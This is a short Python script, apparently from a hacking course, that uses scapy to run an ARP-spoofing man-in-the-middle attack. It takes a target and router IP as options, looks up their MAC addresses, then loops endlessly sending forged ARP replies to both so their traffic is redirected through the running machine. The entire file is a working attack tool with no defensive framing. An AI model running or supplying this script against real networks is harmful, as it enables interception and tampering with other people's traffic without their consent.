import scapy.all as scapy
import time
import sys
import optparse

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target_ip", help="Targets ip address.")
    parser.add_option("-r", "--router", dest="router_ip", help="Routers ip address.")

    (options, arguments) = parser.parse_args()
    
    target_ip = options.target_ip
    router_ip = options.router_ip

    send_packets(target_ip, router_ip)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def send_packets(target_ip, router_ip):
    sent_packets_count = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count = sent_packets_count + 2 
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)




get_arguments()
